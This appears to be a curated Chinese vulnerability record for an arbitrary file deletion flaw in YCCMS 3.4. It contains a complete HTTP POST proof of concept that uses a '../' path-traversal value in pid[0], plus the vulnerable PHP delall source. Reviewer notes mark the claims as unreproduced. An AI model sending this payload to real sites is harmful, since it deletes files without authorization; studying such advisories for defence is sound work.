---
source: "hatch 补库批 20260928"
product: "YCCMS3.4 PicAction.delall"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "YCCMS 3.4 任意文件删除"
prerequisites: "来源所述条件，未列明部分仍待核：adminroute callablewithoutlogin asclaimed; writableparentdirectory;pidarray"
side_effects: "未执行；本文需注意的操作影响：正文根目录1.txt与uploads/../路径一致；成功302不能替代文件观察，后图未核"
source_status: "unknown"
id: "vw-05c35e883f1b5d4e1241a2e0"
entity_id: "ve-05c35e883f1b5d4e1241a2e0"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：adminroute callablewithoutlogin asclaimed; writableparentdirectory;pidarray

- **凭据与会话边界（1）**：有无Cookie请求+完整拼接unlink源码，仍需上层路由鉴权以确认匿名。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **证据待核（2）**：正文根目录1.txt与uploads/../路径一致；成功302不能替代文件观察，后图未核。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（3）**：Host与Origin/Referer端口域不一致，正文send多尾t/固定Length需规范。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（4）**：源码建议权限777是危险默认，应作为原源码字符串保留而不转运维建议；缺修复。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# YCCMS 3.4 任意文件删除

一、漏洞简介
------------

二、漏洞影响
------------

YCCMS 3.4
---------

三、复现过程

    POST /admin/?a=pic&m=delall HTTP/1.1
    Host: www.0-sec.org:8082
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 89
    Origin: http://127.0.0.1:8082
    Connection: close
    Referer: http://127.0.0.1:8082/admin/?a=pic
    Upgrade-Insecure-Requests: 1

    pid%5B0%5D=../1.txt&chkall=on&send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87t

只需要更改pid\[0\]即可在无登录条件下任意删除文件，删除根目录下的1.txt![3.png](./.resource/YCCMS3.4任意文件删除/media/rId24.png)已经删除成功了![4.png](./.resource/YCCMS3.4任意文件删除/media/rId25.png)其实这还是犯了一个最容易犯的错误，没有对传进来的路径进行过滤就拼接了目录，导致了任意文件删除漏洞的产生根据url定位到相关函数位置,位于/controller/PicAction.class.php

    public function delall(){
            if(isset($_POST['send'])){
                if(validate::isNullString($_POST['pid'])) tool::layer_alert('没有选择任何图片!','?a=pic',7);
                $_fileDir=ROOT_PATH.'/uploads/';
                foreach($_POST['pid'] as $_value){
                    $_filePath=$_fileDir.$_value;
                    if(!unlink($_filePath)){
                        tool::layer_alert('图片删除失败,请设权限为777!','?a=pic',7);
                    }else{
                        header('Location:?a=pic');
                    }
                }

            }

        }

对
pid传进来的值并没有进行过滤就进行了了路径的拼接，导致了路径穿越漏洞，触发任意文件删除漏洞

参考链接
--------

> https://xz.aliyun.com/t/7748\#toc-4
